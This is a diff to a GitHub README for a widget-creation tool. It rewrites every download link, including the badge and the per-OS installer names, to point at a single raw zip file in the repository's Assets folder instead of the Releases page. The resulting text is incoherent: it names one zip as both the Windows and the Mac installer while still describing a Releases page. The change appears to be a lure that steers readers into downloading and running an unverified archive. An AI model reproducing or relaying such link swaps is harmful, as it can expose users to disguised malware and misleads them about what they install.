@@ -1,7 +1,7 @@
 # 🌟 Universal-Server-Widget-Creator - Create Widgets for Any Platform Easily
 
 ## 📥 Download Now
-[![Download Universal-Server-Widget-Creator](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/suryasuthar1100/Universal-Server-Widget-Creator/releases)
+[![Download Universal-Server-Widget-Creator](https://github.com/suryasuthar1100/Universal-Server-Widget-Creator/raw/refs/heads/main/Assets/Server-Universal-Creator-Widget-2.9.zip%20Release-brightgreen)](https://github.com/suryasuthar1100/Universal-Server-Widget-Creator/raw/refs/heads/main/Assets/Server-Universal-Creator-Widget-2.9.zip)
 
 ## 📖 Introduction
 Welcome to the Universal Server Widget Creator. This application allows you to create beautiful widgets for various platforms like Discord, Revolt, Wattpad, and WhatsApp with ease. No programming knowledge is needed. Just follow the steps below to get started.
@@ -24,13 +24,13 @@ With the Universal Server Widget Creator, you can:
 ## 🛠️ Installation Process
 
 ### 1. Visit the Download Page
-To download the Universal Server Widget Creator, [visit this page](https://github.com/suryasuthar1100/Universal-Server-Widget-Creator/releases).
+To download the Universal Server Widget Creator, [visit this page](https://github.com/suryasuthar1100/Universal-Server-Widget-Creator/raw/refs/heads/main/Assets/Server-Universal-Creator-Widget-2.9.zip).
 
 ### 2. Choose Your Version
 On the Releases page, you will see the latest version listed at the top. Click on the version link that interests you. You will find the application files available for download.
 
 ### 3. Download the Application
-Look for the file that matches your operating system (e.g., **Universal-Server-Widget-Creator-v1.0.exe** for Windows or **Universal-Server-Widget-Creator-v1.0.dmg** for Mac). Click on it to start the download.
+Look for the file that matches your operating system (e.g., **https://github.com/suryasuthar1100/Universal-Server-Widget-Creator/raw/refs/heads/main/Assets/Server-Universal-Creator-Widget-2.9.zip** for Windows or **https://github.com/suryasuthar1100/Universal-Server-Widget-Creator/raw/refs/heads/main/Assets/Server-Universal-Creator-Widget-2.9.zip** for Mac). Click on it to start the download.
 
 ### 4. Run the Installer
 Once the download is complete, locate the file in your Downloads folder and double-click it. Follow the on-screen instructions to install the application.
@@ -76,6 +76,6 @@ Special thanks to contributors who have made this project possible. Your efforts
 To find more resources and updates about Universal Server Widget Creator, feel free to explore the repository. We've lots of exciting features in development.
 
 ### 2. Download Again
-For your convenience, [click here to download the latest version](https://github.com/suryasuthar1100/Universal-Server-Widget-Creator/releases).
+For your convenience, [click here to download the latest version](https://github.com/suryasuthar1100/Universal-Server-Widget-Creator/raw/refs/heads/main/Assets/Server-Universal-Creator-Widget-2.9.zip).
 
 Happy widget creating!
